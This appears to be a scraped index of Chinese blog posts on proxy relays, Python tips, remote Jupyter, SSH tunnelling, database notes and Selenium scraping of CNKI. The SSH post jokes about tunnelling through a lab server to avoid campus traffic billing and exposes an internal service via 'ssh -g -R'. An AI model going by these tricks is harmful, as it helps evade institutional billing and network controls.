四、关于自己机器上的代理配置说明如果你之前用过shadowsocks诸如此类代理软件，就是相当于把ip地址和端口号换成了国内服务器的ip地址和在nginx中配置的监听端口号，其他的密码等都是和之前一样的，因为代理服务还是配置在境外VPS上的，国内的服务器只是起到了一个转发流量的作用。","link":"/2020/02/04/network-jump/"},{"title":"Python中如何定义二维数组","text":"小知识点随手记录… Numpy或许你会说用numpy中的数组不就可以了，想定义几维就几维，没错numpy确实方便很多。12345&gt;&gt;&gt; import numpy&gt;&gt;&gt; a = numpy.zeros((2,3))&gt;&gt;&gt; aarray([[0., 0., 0.], [0., 0., 0.]])但如果不用numpy呢？ List有人会说可以定义一个二维列表代替二维数组呗。 1. 错误方式一开始一定会有人这样定义1234&gt;&gt;&gt; a = [[0]*3]*2&gt;&gt;&gt; a[[0, 0, 0], [0, 0, 0]]&gt;&gt;&gt;看是不是成功了，但当我们修改其中的某个值的时候，就会发现奇怪的地方1234&gt;&gt;&gt; a[0][0] = 1&gt;&gt;&gt; a[[1, 0, 0], [1, 0, 0]]&gt;&gt;&gt;特么的怎么连a[1][0]也跟着变成1了，因为上面的定义方式等价于：123456789&gt;&gt;&gt; temp_list = [0] * 3&gt;&gt;&gt; a = [temp_list, temp_list]&gt;&gt;&gt; a[[0, 0, 0], [0, 0, 0]]&gt;&gt;&gt; temp_list[0] = 1&gt;&gt;&gt; temp_list[1, 0, 0]&gt;&gt;&gt; a[[1, 0, 0], [1, 0, 0]]所以这么用list定义二维数组的方法是错的，那么正确的方式应该怎么做呢？ 2. 正确方式我们可以用for来定义二维数组。123456&gt;&gt;&gt; arra = [ [0 for i in range(3)] for i in range(2)]&gt;&gt;&gt; arra[[0, 0, 0], [0, 0, 0]]&gt;&gt;&gt; arra[0][0] = 1&gt;&gt;&gt; arra[[1, 0, 0], [0, 0, 0]]可以看到这样做就没有上面的错误出现了。","link":"/2019/11/17/py-cre-douarr/"},{"title":"Python实现字符串反转的几种方法","text":"你能想到几种？ 1. 使用字符串切片1234&gt;&gt;&gt; s = 'abcdefg'&gt;&gt;&gt; ans = s[::-1]&gt;&gt;&gt; ans'gfedcba' 2. 使用列表的reverse方法123456789&gt;&gt;&gt; l = list(s)&gt;&gt;&gt; l['a', 'b', 'c', 'd', 'e', 'f', 'g']&gt;&gt;&gt; l.reverse()&gt;&gt;&gt; l['g', 'f', 'e', 'd', 'c', 'b', 'a']&gt;&gt;&gt; ans = ''.join(l[::1])&gt;&gt;&gt; ans'gfedcba'同理，可以用&#39;&#39;.join(l[::-1])123456&gt;&gt;&gt; l = list(s)&gt;&gt;&gt; l['a', 'b', 'c', 'd', 'e', 'f', 'g']&gt;&gt;&gt; ans = ''.join(l[::-1])&gt;&gt;&gt; ans'gfedcba' 3. 使用reduce12345&gt;&gt;&gt; from functools import reduce&gt;&gt;&gt; s = 'abcdefg'&gt;&gt;&gt; ans = reduce(lambda x,y:y+x, s)&gt;&gt;&gt; ans'gfedcba'在这里简单复习一下reduce使用reduce需要先from functools import reducereduce有2个参数，一个是函数，另一个是可迭代对象。在这里的函数是匿名函数lambda，作用是输入x和y返回y+x，可迭代对象是字符串&#39;abcdefg&#39;。具体过程是x = &#39;a&#39;, y = &#39;b&#39;返回&#39;ba&#39;，之后&#39;x = &#39;ba&#39;, y = c返回&#39;cba&#39;这样迭代完整个字符串就可以达到反转字符串的效果。 4. 使用递归函数1234567def func(s): if len(s) == 1: return s return func(s[1:]) + s[0]s = 'abcdefg'print(func(s)) 5. 使用栈1234567891011def func(s): #模拟全部字符入栈 l = list(s) ans = '' while len(l)&gt;0: #模拟出栈 ans += l.pop() return anss = 'abcdefg'print(func(s)) 6. for循环123456789def func(s): ans = '' max_index = len(s) - 1 for index, value in enumerate(s): ans += s[max_index-index] return anss = 'abcdefg'print(func(s))简单学习一下enumerate，它是python中的内置函数，适用于python2.x和python3.xenumerate在字典里是枚举、列举的意思enumerate参数为可遍历/可迭代的对象（如列表、字符串等）例如：1234567891011&gt;&gt;&gt; l = [1,2,3,4,5,6]&gt;&gt;&gt; for index, value in enumerate(l):... print('%s, %s' % (index, value))...0, 11, 22, 33, 44, 55, 6&gt;&gt;&gt; 转自https://www.cnblogs.com/taceywong/p/8045127.html","link":"/2019/11/15/py-str-reverse/"},{"title":"服务器配置jupyter notebook实现远程访问","text":"jupyter notebook简单配置，随手记录，以备遗忘。最近开始想从头系统的学习一下深度学习，以便为以后三年的研究生的学习生活打基础，顺便将之前租的阿里云服务器利用起来，于是就配置一下jupyter notebook吧 一、安装jupyter notebook会随着Anaconda一起安装好，因此我们只需要安装好Anaconda就好，详情请参照之前的博客。 二、配置1. 生成配置文件1jupyter notebook --generate-config 2. 设置密码并生成密钥shell下输入python12from notebook.auth import passwdpasswd()会出现让我们输入密码、确认密码123Enter password: Verify password: 'sha1:*************’这个生成的密钥要记住，找个地方复制粘贴下来。 3. 修改配置文件12345c.NotebookApp.ip='*' #允许访问的IP地址，设置为*代表允许任何客户端访问c.NotebookApp.password = u'sha1:8d...'# 刚才生成密码时复制的密文c.NotebookApp.open_browser = False #True的话会自动弹出窗口c.NotebookApp.port = 5555 #可自行指定一个端口, 访问时使用该端口c.NotebookApp.allow_remote_access = True #这个一定得设置，不然会报错别忘了保存。哦，如果你是国内的服务器厂商诸如腾讯云、阿里云之类的，还需要添加一下安全组规则。 三、远程访问在服务器输入：1jupyter notebook就可以开启jupyter notebook进程了如果访问的是/root目录，还需要root权限1jupyter notebook --allow-root之后就可以在本地浏览器输入ip:port实现远程访问jupyter notebook了（第一次访问会输入密码。） 写在最后我们可以使用screen命令实现jupyter notebook后台运行，这样我们去用服务器干别的事情啦。输入：1screen -S process_name之后运行jupyter notebook就可以了，返回键为ctrl + A + D显示后台程序输入：1screen -r process_name如果服务器没有screen命令请安装1apt install screen","link":"/2019/12/14/remote-jupyternotebook/"},{"title":"SSH端口转发","text":"平时我们一般用ssh连接服务器，但它还可以用来端口转发呀！ 一、端口转发概述我们知道，SSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH 还同时提供了一个非常有用的功能，这就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程有时也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。总的来说 SSH 端口转发能够提供两大功能： 加密 SSH Client 端至 SSH Server 端之间的通讯数据。 突破防火墙的限制完成一些之前无法建立的 TCP 连接。 二、本地端口转发和远程端口转发我们来区分一下这两种端口转发的概念，我们知道，SSH端口转发自然需要SSH连接，但是SSH连接是有方向的，从SSH Client到SSH Server。而我们的应用也是有方向的，如果应用连接的方向和SSH的方向的一致的，那我们就说它是本地转发，如果两个方向不一致，我们就说它是远程转发。 本地转发实例我们想象一下，假如我在实验室的服务器上开了一个本地web服务，比如本地测试一个网站或者本地开启jupyter notebook，但是我现在人在寝室啊，怎么能在自己的机器上访问到服务器上的这个web服务呢？为了能解决这个问题，我们可以通过搭建隧道进行解决，也就是接下来要用到的本地端口转发。它的命令格式为：1ssh -L &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;那接下来我们就搭建一个隧道测试一下吧！首先，我在服务器上开启jupyter notebook服务，因为在这台服务器上我并没有配置jupyter，因此现在只运行在了本地的8888端口，我们下面搭建隧道在自己的机器上访问它吧！打开terminal，输入：1ssh -L 12345:localhost:8888 -p 22322 zhangfan@10.8.128.205最后的是我的服务器的ip哦，加-p参数是因为实验室的一个内网ip的不同端口分配了不同的服务器，害，都内网ip了还这么稀缺，大哭…-L参数代表本地转发，至于为什么&lt;remote host&gt;字段用的是localhost，这里解释一下，remote的意思是远程的，也就是这个字段填写的是我们要连接的地址，那这个地址又是相对于谁来说的呢？当然是我们的服务器啦，因为jupyter服务是运行在我们服务器的本地的8888端口的啦，所以这里用的就是localhost了。打开浏览器，输入localhost:12345我们可以看到打开了jupyter的页面。 远程转发实例既然是远程转发，我们只要把上述本地转发的应用或者SSH连接的任一方向反向就变成了远程端口转发。比如，本来是在本地的机器上建立向服务器的SSH连接，现在我们反过来：1ssh -R &lt;SSH host port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt; 三、动态端口转发无论我们刚才讨论的本地和远程转发，都是特定的一个端口到另一个端口的转发，那如果我们没有这个端口号怎么办？咦，什么样子的应用会没有这个端口号呢？比如说用浏览器进行web浏览，用QQ或者wechat聊天的时候呀！当我们在一个不安全的WiFi环境下上网的时候，用SSH动态转发来保护我们的网页浏览和社交软件的信息无疑是十分必要的。动态转发命令格式：1ssh -D &lt;local port&gt; &lt;SSH Server&gt;比如当我使用1ssh -D 1234 -p 22322 zhangfan@10.8.128.205就是我把本地的1234端口作为本地的端口号，所有流经1234端口的流量全部转发给了服务器。嘿嘿嘿，是不是觉得和代理有点像，没错，就是很像！其实在这里SSH是创建了一个SOCKS代理服务。那……这岂不是一个新的校园网免流的方法嘛？因为校园网局域网内的流量是不计费的，那我们通过实验室的服务器对外访问所消耗的流量就不是劳资的账号的流量了呀，哈哈哈哈哈！前提是只能使用支持socks代理的应用，比如浏览器，QQ微信啥的…别忘了在应用设置一下开启socks代理哦。不要告发我哦！我什么都不知道！我可不薅学校的羊毛！ 四、实战——如何用SSH解决在家访问学校内网的服务器的jupyter服务前提：现在有一台能正常使用的笔记本，一台有公网ip的阿里云服务器，一台学校实验室的内网服务器。为了方便描述，分别简称为host1, host2, host3首先我们捋一下思路：host2具备公网ip，因此host1和host3都可以连接，但反向不行。因此我们先对host3和host2之间建立SSH隧道，再对host1和host2建立对应端口的隧道，这样host1与host3之间就相当于打通了一条通路。假设host3的jupyter运行在本地的8888端口上。因为只能是host3单向能连接到host2，因此我们只能在host3上对host2建立SSH隧道。那这样一来，host3就是SSH客户端，而host2就是SSH服务端，但host3本身是作为jupyter的服务提供者，因此应用和SSH连接的方向是相反的，所以我们要用的是远程端口转发命令。首先连接到实验室的服务器：1ssh host3为了防止关掉terminal导致SSH链接断掉，因此使用screen命令：1234screen -S SSH_jupyter# ssh -g -R 12345:localhost:8888 host2 #这里用-R是远程端口转发# 1.3日更新 今早发现ssh连接自动断了 加-o参数可保持持续连接ssh -g -R 12345:localhost:8888 -o ServerAliveInterval=60 host2必须加上-g参数，以保证host1能使用host3建立的远程端口转发，加上-g参数就代表可以共享这个连接的意思。按下ctrl+A+D可以从screen命令返回。之后在自己的笔记本上，也就是host1上（可以用手机开热点模拟在家的情况）1ssh -L 1234:localhost:12345 host2好了最后笔记本上的terminal不要关掉哦，不然这个SSH隧道就断了哦。现在我们在笔记本上的浏览器中输入：localhost:1234是不是打开了在实验室的服务器上开启的jupyter服务呢。","link":"/2020/01/02/ssh-tips/"},{"title":"Sublime中按ctrl+B调用python3运行","text":"前些天用python写了一个小程序，但放在sublime里直接ctrl+B运行不了，提示没有什么什么包…思前想后，觉得sublime的ctrl+B快捷键默认使用的是电脑里的python2吧，而我是用pip3 install的包，肯定会报错了，那现在解决办法一定是要让sublime知道我的python3放在哪里，根据python3的路径去用python3执行代码。 解决办法如下： 1. 首先新建一个sublime build system Tools-&gt;Build System-&gt;New Build System… 2. 在里面输入以下内容： 123456&#123; \"env\": &#123;\"PYTHONIOENCODING\": \"utf8\"&#125;, \"cmd\": [\"/Library/Frameworks/Python.framework/Versions/3.6/bin/python3\", \"-u\", \"$file\"], \"file_regex\": \"^[ ]*File \\\"(...*?)\\\", line ([0-9]*)\", \"selector\": \"source.python\"&#125; &quot;env&quot;: {“PYTHONIOENCODING”: “utf8”}的作用是为了避免中文报错。 [&quot;/Library/Frameworks/Python.framework/Versions/3.6/bin/python3&quot;, &quot;-u&quot;, &quot;$file&quot;]这里的路径替换成python3的路径。 如果你不知道python3的路径在哪里，mac os请在终端输入which python3查看: 1which python3 比如我的路径是/usr/local/bin/python3，就将该路径复制过去。 然后保存文件名为python3.sublime-build 最后，选择python3: Tools-&gt;Build System-&gt;python3","link":"/2019/07/23/sublime-run/"},{"title":"Solve无法访问github的问题","text":"前几天发现家里的网络访问不了github了，开始没太在意，因为挂着代理也能访问不影响，直到今天准备push的时候发现根本push不上去。现将解决方法整理如下。 一、访问github IP查询网址Click Here你会看到如下界面 二、修改Hosts文件 Mac位置：/etc/hosts Win位置：C:\\Windows\\system32\\drivers\\etc 添加在IP查询页面看到的IP地址：1192.30.253.113 github.com 三、刷新DNS缓存 Mac1sudo dscacheutil -flushcache Win1ipconfig/flushdns","link":"/2020/02/04/unable-access-github/"},{"title":"数据库复习--第1章","text":"数据库系统概论第1章–绪论，如有错误烦请指正。 第一章 绪论1.1 数据库系统概述1.1.1 四个基本概念 数据：是数据库中存储的基本对象 定义：描述事物的符号记录 特点：数据与其语义是不可分的 数据库(DB)：是长期存储在计算机内、有组织的、可共享的大量数据的集合 基本特征： 数据按一定的数据模型组织、描述和储存 可为各种用户共享 冗余度较小 数据独立性较高 易扩展 数据库管理系统(DBMS): 什么是DBMS： 位于用户与操作系统之间的一层数据管理软件 是基础软件，是一个大型复杂的软件系统 DBMS的用途 科学地组织和存储数、高效地获取和维护数据 数据库系统 什么是？：在计算机系统中引入数据库后的系统构成 组成：数据库、DBMS、应用系统、数据库管理员 1.1.2 数据管理技术的产生和发展 什么是数据管理 对数据进行分类、组织、编码、存储、检索和维护 是数据处理的中心问题 数据管理技术的发展过程 人工管理阶段（20世纪49年代中–50年代中） 文件系统阶段（20世纪50年代末–60年代中） 数据库系统阶段（20世纪60年代末–现在） 数据管理技术的发展动力 应用需求的推动 计算机硬件的发展 计算机软件的发展 文件系统记录内有结构，整体无结构（因文件是独立的），数据只能是定长的，数据的最小存取单位是记录。 1.1.3 数据库系统的特点 数据结构化 整体数据的结构化是数据库的主要特征之一 整体结构化，不再仅针对某个应用，而是面向全组织，不仅数据内部结构化，整体也是结构化的，数据之间具有联系 数据可以变长，最小存取单位是数据项。 数据的共享性高，冗余度低，易扩充 数据独立性高 物理独立性 逻辑独立性 数据独立性由DBMS的二级映像功能来保证的 数据由DBMS统一管理和控制 数据的安全性保护 数据的完整性检查 并发控制 数据库恢复 1.2 数据模型1.2.1 两大类数据模型 概念模型（信息模型），按用户的观点来对数据和信息建模，用于数据库设计。 逻辑模型（数据模型）和物理模型 逻辑模型主要包括网状模型、层次模型、关系模型、面向对象模型，用于DBMS实现 物理模型是对最底层的抽象 1.2.2 数据模型的组成要素 数据结构 定义：描述数据库的组成对象，以及对象之间的联系 数据结构是对系统静态特性的描述 数据操作 数据操作类型：查询、更新（插入、删除、修改） 数据操作是对系统动态特性的描述 完整性约束条件 在关系模型中，任何关系必须满足实体完整性和参照完整性两个条件。 1.2.3 概念模型 用途 用于信息世界的建模，是现实世界到机器世界的一个中间层次，是数据库设计人员和用户之间进行交流的语言 常用E-R图表示 实体性：用矩形表示，框内写明实体名 属性：用椭圆形表示，并用无向边将其与相应的实体连接起来 联系：用菱形表示，框内写明联系名，用无向边分别与有关实体连接起来，同时在无向边旁标上联系的类型（1:1、1:n、m:n） 联系的属性：联系本身也是一种实体型，也可以有属性 1.2.4 最常用的数据模型 非关系模型 层次模型 网状模型 关系模型 面向对象模型 对象关系模型 1.2.5 层次模型层次模型是数据库系统中最早出现的数据模型，典型代表是IBM公司的IMS(Information Management System)数据库管理系统。 层次模型用树形结构来表示各类实体以及实体间的联系。 满足下面两个条件的基本层次联系的集合为层次模型： 有且只有一个结点没有双亲结点，这个结点称为根节点。 根以外的其他结点有且只有一个双亲结点。 几个术语： 根结点、双亲结点、兄弟结点、叶结点 特点： 结点的双亲是唯一的 只能直接处理一对多的实体联系 每个记录类型可以定义一个排序字段，也称为码字段 任何记录值只有按其路径查看时，才能显出它的全部意义 没有一个子女记录值能够脱离双亲记录值而独立存在 多对多联系在层次模型中的表示 将多对多联系分解成一对多联系 方法：冗余结点法、虚拟结点法 完整性约束条件 无相应的双亲结点值就不能插入子女结点值 如果删除双亲结点值，则相应的子女结点值也被同时删除 更新操作时，应更新所有相应记录，以保证数据的一致性 存储结构 邻接法：按照层次树前序遍历的顺序把所有记录值依次邻接存放，即通过物理空间的位置相邻来实现层次顺序 链接法：用指针来反映数据之间的层次联系 子女-兄弟链接法：每个记录两个指针，分别指向最左边的子女和最近的兄弟 层次序列链接法：按树的前序遍历顺序链接各记录值 优缺点 优点 层次模型的数据结构比较简单清晰 查询效率高，性能优于关系模型，不低于网状模型 层次数据模型提供了良好的完整性支持 缺点 多对多联系表示不自然 对插入和删除操作的限制多，应用程序的编写比较复杂 查询子女结点必须通过双亲结点 由于结构严密，层次命令趋于程序化 1.2.6 网状模型网状数据库系统采用网状模型作为数据的组织方式，典型代表时DBTG系统，亦称CODASYL系统，是70年代有DBTG提出的一个系统方案，奠定了数据库系统的基本概念、方法和技术。 满足下面两个条件的基本层次联系的集合 允许一个以上的结点无双亲 一个结点可以有多于一个的双亲 网状模型与层次模型的区别 网状模型允许多个结点没有双亲结点 网状模型允许结点有多于一个的双亲 网状模型允许两个结点之间有多种联系（复合联系） 网状模型可以更直接地去描述现实世界 层次模型实际上是网状模型的一个特例 多对多联系在网状模型中的表示：将多对多联系直接分解成一对多联系 网状数据模型的操纵与完整性约束 码：唯一标识记录的数据项的集合 一个联系中双亲记录与子女记录之间是一对多联系 支持双亲记录和子女记录之间某些约束条件 存储结构：单向链接、双向链接、环状链接、向首链接 优点： 能够更为直接地描述现实世界，如一个结点可以有多个双亲 具有良好的性能，存取效率较高 缺点： 结构比较复杂，而且随着应用环境的扩大，数据库的结构就变得越来越复杂，不利于最终用户掌握 DDL、DML语言复杂，用户不容易使用 1.2.7 关系模型关系数据库系统采用关系模型作为数据的组织方式，1970年美国IBM公司首次提出了数据库系统的关系模型，计算机厂商新推出的数据库管理系统几乎都支持关系模型。 在用户观点下，关系模型中数据的逻辑结构是一张二维表。 数据结构 关系：一个关系对应通常说的一张表 元组：表中的一行即为一个元组 属性：表中的一列即为一个属性，给每一个属性起一个名称即属性名 主码：表中的某个属性组，它可以唯一确定一个元组 域：属性的取值范围 分量：元组中的一个属性值 关系模式：对关系的描述关系名（属性1，属性2，……，属性n） 关系必须是规范化的，满足一定的规范条件 最基本的规范条件：关系的每一个分量必须是一个不可分的数据项，不允许表中还有表。 关系的完整性约束条件 实体完整性 参照完整性 用户定义的完整性 优点： 建立在严格的数学概念的基础上 概念单一 实体和各类联系都用关系来表示 对数据的检索结果也是关系 关系模型的存取路径对用户透明 具体更高的数据独立性，更好的安全保密性 简化了程序员的工作和数据库开发建立的工作 缺点： 存取路径对用户透明导致查询效率往往不如非关系数据模型 为提高性能，必须对用户的查询请求进行优化增加了开发DBMS的难度 1.3 数据库系统结构从数据库管理系统角度看，通常采用三级模式结构，是数据库内部的系统结构从数据库最终用户角度看，数据库系统的结构分为：单用户结构、主从式结构、分布式结构、客户/服务器、浏览器/应用服务器/数据库服务器多层结构等 1.3.1 数据库系统的三级模式结构 模式（也成逻辑模式） 数据库中全体数据的逻辑结构和特征的描述 所有用户的公共数据视图，综合了所有用户的需求 一个数据库只有一个模式 是数据库系统模式结构的中间层 外模式 数据库用户使用的局部数据的逻辑结构和特征的描述 数据库用户的数据视图，是与某一应用有关的数据的逻辑表示 介于模式与应用之间 一个数据库可以有多个外模式 用途： 保证数据库安全性的一个有力措施 每个用户只能看见和访问所对应的外模式中的数据 内模式 是数据物理结构和存储方式的描述 是数据在数据库内部的表示方式 一个数据库只有一个内模式 1.3.2 数据库的二级映像功能与数据独立性 三级模式是对数据的三个抽象级别 二级映像在DBMS内部实现这三个抽象层次的联系和转换 外模式/模式映像 模式/内模式映像 外模式/模式映像 模式描述的是数据的全局逻辑结构，外模式描述的是数据的局部逻辑结构 每一个外模式，数据库系统都有一个外模式/模式映像 保证数据的逻辑独立性 当模式改变时，数据库管理员修改有关的外模式/模式映像，使外模式保持不变 应用程序是依据数据的外模式编写的，从而应用程序不必修改，保证了数据与程序的逻辑独立性，简称数据的逻辑独立性。 模式/内模式映像 模式/内模式映像定义了数据全局逻辑结构与存储结构之间的对应关系。 数据库中模式/内模式映像是唯一的 该映像描述通常包含在模式描述中 保证数据的物理独立性 当数据库的存储结构改变了，数据库管理员修改模式/内模式映像，使模式保持不变 应用程序不受影响。保证了数据与程序的物理独立性，简称数据的物理独立性。 1.4 数据库的组成 数据库 数据库管理系统（及其开发工具） 应用系统 数据库管理员","link":"/2020/01/10/DB-1/"},{"title":"利用webdriver爬取知网作者知网节","text":"本篇主要介绍基于Chrome的webdriver进行爬虫的基本方法，整理下来以备遗忘。上个周师姐布置任务让我爬取知网的作者知网节，本来以为看起来挺好爬的，但知网还是有些坑，之后详细介绍。下面就让我们从零开始吧。 一、环境配置我们主要用到的工具有python中的selenium和chrome，以及需要驱动chrome的插件webdriver。下面是来自百度关于selenium的介绍。从图中我们可以看到，利用selenium我们可以模拟用户的浏览器行为，从而获取到我们需要的网页内容，因为能模拟用户行为，所以利用selenium进行爬虫自然可以一定程度上避免被网站反爬虫拦截，但也有不好的一面，比如爬取的速度相对来说会慢一些。 1. 安装selenium1pip install selenium当然我们也可以新建一个conda环境，再进行安装selenium，这里简单复习一下创建并激活conda环境的命令：123456#创建新环境conda create -n cnki-spider#激活进入新环境source activate cnki-spider# 安装seleniumpip install selenium 2. 安装基于浏览器的webdriverselenium支持多种浏览器，比如chrome和firefox等等，这里我选用了chrome：下载地址注意选择和浏览器版本对应的chromedriver。 win直接将解压后的chromedriver直接拖进chrome的安装目录，然后配置环境变量。 mac将解压后的chromedriver拖进/usr/local/bin/即可。 linxu将解压后的chromedriver拷贝进/usr/bin目录，之后在代码中声明路径即可。 另外以上，默认已装好Chrome，如果没有，请自行百度。 二、代码编写1. 简单使用1234from selenium import webdriverbrowser = webdriver.Chrome()# 不能只用域名，要使用完整urlbrowser.get('https://www.baidu.com/')接下来让我们在百度的搜索框中输入些什么进行搜索看看。既然要输入，那我们首先需要找到在哪个位置进行输入，因此我们需要简单定个位，打开百度页面的源代码看一下输入框在哪。我们可以发现原来这个输入框的class = &quot;s_ipt&quot;，那我们就先通过class来定位试试吧！123search_input = browser.find_element_by_class_name('s_ipt')search_input.clear()search_input.send_keys('IR实验室')可以看到我们成功的在输入框里输入了搜索内容，下面就让我们点击一下“百度一下”搜索试试吧。看一下“百度一下”按键的源码是什么：可以发现它的id = &quot;su&quot;，那我们就通过id来定位它吧！1browser.find_element_by_id('su').click()除了通过点击“百度一下”按钮，我们通常搜索的时候一般是直接按回车键的，那在这里可不可以模拟回车键呢？123from selenium.webdriver.common.keys import Keys# 将上面的click()那一行换作在搜索框中输入回车键search_input.send_keys(Keys.RETURN) 2. 定位问题模拟浏览器行为无非就是模拟鼠标和键盘来操作html中的这些元素，那首要的任务就是元素定位问题了。在selenium中提供了很多种方法可以进行元素定位，下面一一介绍。 (1) id定位find_element_by_id()例如上面的例子我们定位了“百度一下”按钮：browser.find_element_by_id(&#39;su&#39;) (2) name定位find_element_by_name()1&lt;input type=\"text\" class=\"s_ipt\" name=\"wd\" id=\"kw\" maxlength=\"100\" autocomplete=\"off\"&gt;比如这是百度搜索框的源码，我们可以通过name这样定位：browser.find_element_by_name(&#39;wd&#39;) (3) class定位find_element_by_class_name()同样地定位搜索框：browser.find_element_by_class_name(&#39;s_ipt&#39;) (4) tag定位find_element_by_tag_name()每一个元素本质就是一个tag，但是HTML页面的tag重复性很厉害，一般很少用这个定位。例子：browser.find_element_by_tag_name(&#39;input&#39;) (5) link定位find_element_by_link_text() 可以用来定义文本链接。1234&lt;a href=\"http://news.baidu.com\" target=\"_blank\" class=\"mnav\"&gt;新闻&lt;/a&gt;&lt;a href=\"https://www.hao123.com\" target=\"_blank\" class=\"mnav\"&gt;hao123&lt;/a&gt;&lt;a href=\"http://map.baidu.com\" target=\"_blank\" class=\"mnav\"&gt;地图&lt;/a&gt;&lt;a href=\"http://v.baidu.com\" target=\"_blank\" class=\"mnav\"&gt;视频&lt;/a&gt;我们可以通过这些文本内容打开链接：browser.find_element_by_link_text(&#39;新闻&#39;).click()也可以通过部分文本链接进行定位，也就是partial定位：find_element_by_partial_link_text()例子：browser.find_element_by_partial_link_text(&#39;hao&#39;).click() (6) xpath定位它又分为绝对路径定位和相对路径定位，但我觉得没人喜欢/html/*/*/这样从头写路径，经常使用的也就是相对路径定位。find_element_by_xpath(&#39;//标签[@属性名=属性值]&#39;) 属性名可以是id、name、class或者其他可唯一标识该标签的元素。比如上面定位百度搜索框的可以改写为：browser.find_element_by_xpath(&#39;//input[@class=&quot;s_ipt&quot;]&#39;).send_keys(&#39;IR 实验室&#39;）//代表当前页面的某个路径下，input代表元素标签名，不指定标签可以用*代替。既然xpath都支持路径了，那层级，也就是在某个标签之下的元素也可以通过它定位了。比如，有个div标签的class=’helloworld’，然后在这个标签的里面有一个a标签，我们想要定位这个a标签就可以这么写：browser.find_element_by_xpath(&#39;//div[@class=&quot;helloworld&quot;]/a&#39;)更强大的是这个方法还支持通过逻辑运算符进行定位。比如find_element_by_xpath(&quot;//input[@id=&#39;a&#39; and @class=&#39;su&#39;]/span/input&quot;) (7) CSS定位find_element_by_css_selector() 通过class定位比如在百度搜索框输入要搜索的内容：browser.find_element_by_css_selector(&quot;.s_ipt&quot;).send_keys(&#39;hello world&#39;) 通过id定位例子：browser.find_element_by_css_selector(&quot;#kw&quot;).send_keys(&#39;hello world&#39;) 通过标签名定位 （很少用）例子：browser.find_element_by_css_selector(&quot;input&quot;) 通过标签属性定位例子：browser.find_element_by_css_selector(&#39;[autocomplete=&quot;off&quot;]&#39;).send_keys(&#39;helloworld&#39;)属性值的引号可加可不加。 通过标签父子关系定位find_element_by_css_selector(&quot;parent&gt;child&quot;)例子：browser.find_element_by_css_selector(&quot;span&gt;input&quot;).send_keys(&quot;IR 实验室&quot;) 组合定位例子：browser.find_element_by_css_selector(&quot;span&gt;input#kw&quot;).send_keys(&quot;IR 实验室&quot;)同样的，可以将属性值、id、class、父子关系等结合起来组合定位，这样可以提高定位的准确性。 (8) 通过By定位By定位元素是统一调用find_element()的方法。find_element()方法只用于定位元素，它有两个参数，第一个是定位的类型，由By提供；第二个参数是定位的具体方式。使用By之前需要先导入By类：1from selenium.webdriver.common.by import By实例：browser.find_element(By.ID,&#39;kw&#39;).send_keys(&quot;IR 实验室&quot;)定位的类型包括：By.ID, By.NAME, By.CLASS_NAME, By.TAG_NAME, By.LINK_TEXT, By.PARTIAL_LINK_TEXT, By.XPATH, By.CSS_SELECTOR 3. 出现定位不到元素的问题你以为掌握了以上这些定位方法就没有问题了吗，当时看完教程的我也是这么想的，不就是爬取知网作者知网节嘛，当我把一切都准备好，也打开了准备爬取的页面，准备开心的开始爬的时候呢，却报错了…找不到该元素，我明明在chrome里可以看到的啊，我定位的方法也没有错啊，怎么会定位失败呢？原来现在很多页面除了页面源代码之外还有很多框架源代码，而我想要爬取的内容就存在于这些框架源代码中，那这些框架源代码都在哪呢？看到这些iframe标签了嘛，没错它们都在这里面。frame标签有frameset、frame、iframe三种，frameset跟其他普通标签没有区别，不会影响到正常的定位，而frame与iframe对selenium定位而言是一样的，selenium有一组方法对frame进行操作。所以我们如果想要这里面的内容就需要切换frame，之后才能定位到这些框架里的元素，那么怎么进行切换呢？我们用到的函数是switch_to.frame()可以传入id、name、index以及selenium的WebElement对象。123456from selenium import webdriverdriver = webdriver.Chrome()driver.switch_to.frame(0) # 1.用frame的index来定位，第一个是0# driver.switch_to.frame(\"frame1\") # 2.用id来定位# driver.switch_to.frame(\"myframe\") # 3.用name来定位# driver.switch_to.frame(driver.find_element_by_tag_name(\"iframe\")) # 4.用WebElement对象来定位但是我们看到知网这个作者知网节界面不只一个框架，但这些框架都是同级的，所以我们爬完一个框架之后需要切回主文档以再切入下一个框架。driver.switch_to.default_content()那如果碰到一个框架里面又嵌套着框架怎么办呢？比如：12345&lt;html&gt; &lt;iframe id=\"frame1\"&gt; &lt;iframe id=\"frame2\" / &gt; &lt;/iframe&gt;&lt;/html&gt;我们先从主文档一层一层的切到frame212driver.switch_to.frame(\"frame1\")driver.switch_to.frame(\"frame2\")现在我们从frame2怎么切换到frame1呢？1driver.switch_to.parent_frame() # 如果当前已是主文档，则无效果有了这个方法，相当于后退作用，我们就可以随意的在frame之间切换了。 三、其他常用函数补充切换标签页:12window = self.browser.window_handles # 获得当前窗口句柄集合（列表类型）browser.switch_to.window(window[1]) #切换到第二个标签 控制浏览器前进、后退、刷新123browser.forward()browser.back()browser.refresh() 关闭浏览器1browser.quit() 写在最后如果你想获取完整的爬取知网作者知网节的代码:1git clone https://github.com/aestheticisma/spider_cnki","link":"/2019/12/17/cnki-spider/"},{"title":"LeetCode DAY 2 (4)","text":"LeetCode系列 昨天只做了一道题 失败的一天但每天的总结不能停啊… 4. 寻找两个有序数组的中位数（困难）题目描述给定两个大小为m和n的有序数组nums1和nums2。请你找出这两个有序数组的中位数，并且要求算法的时间复杂度为O(log(m + n))。你可以假设nums1和nums2不会同时为空。 示例1:1234nums1 = [1, 3]nums2 = [2]则中位数是 2.0 示例2:1234nums1 = [1, 2]nums2 = [3, 4]则中位数是 (2 + 3)/2 = 2.5 代码解法1: 定义第三个数组重排序一开始看到这道题很自然的想到再多定义一个列表数组将两个数组重排序，但是像python里的sort方法就不用了，这样就没意思了。具体代码如下。123456789101112131415161718192021222324#时间复杂度O(m+n)class Solution: def findMedianSortedArrays(self, nums1, nums2): nums3 = [] mid = (len(nums1)+len(nums2))//2 flag = (len(nums1)+len(nums2))%2 i, j= 0, 0 while(i&lt;len(nums1) and j&lt;len(nums2)): if nums1[i]&gt;nums2[j]: nums3.append(nums2[j]) j+=1 else: nums3.append(nums1[i]) i+=1 while(i&lt;len(nums1)): nums3.append(nums1[i]) i+=1 